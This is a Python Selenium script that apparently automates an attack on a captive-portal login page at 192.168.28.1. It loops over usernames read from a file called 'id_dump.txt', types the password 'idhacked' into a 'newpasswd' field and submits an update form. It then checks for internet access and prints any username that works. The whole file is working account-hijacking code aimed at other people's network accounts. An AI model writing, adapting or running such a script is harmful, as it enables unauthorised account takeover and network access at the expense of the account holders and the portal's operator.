#login

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
import selenium.common.exceptions as selexcept

driver = webdriver.Firefox(executable_path="C:\\Users\\Tanish\\Downloads\\Compressed\\geckodriver.exe")

#driver.get("http://192.168.28.1:2280/cportal/ip/user_login.php?url=http://www.gstatic.com/generate_204")

f = open("id_dump.txt", "r")
id = f.readlines()

for i in id:
    driver.get("http://192.168.28.1:2280/cportal/ip/user_login.php?url=http://www.gstatic.com/generate_204")
    driver.switch_to.frame("login_win")

    wait = WebDriverWait(driver, 10)
    element = wait.until(EC.element_to_be_clickable((By.XPATH, "//*[@id='terms']")))

    u_name = driver.find_element_by_id("usrname")
    u_pass = driver.find_element(By.ID, 'newpasswd')

    # check_box = driver.find_element(By.ID, 'terms')

    u_name.send_keys(i)
    u_pass.send_keys("idhacked")
    element.click()

    login_button = driver.find_element_by_id("update_btn").click()

    driver.quit()

    driver = webdriver.Firefox(executable_path="C:\\Users\\Tanish\\Downloads\\Compressed\\geckodriver.exe")

    driver.get("http://1.1.1.1")

    wait = WebDriverWait(driver, 10)
    element = wait.until(EC.presence_of_element_located((By.XPATH, "/html/body/div[1]/img")))

    try:
        if driver.find_element_by_xpath("/html/body/div[2]/span[5]/font/a").is_displayed():
            driver.quit()
            print(i)
            break
    except (selexcept.NoSuchElementException, selexcept.TimeoutException, selexcept.WebDriverException) as err:
        driver.quit()
        print(i)
        continue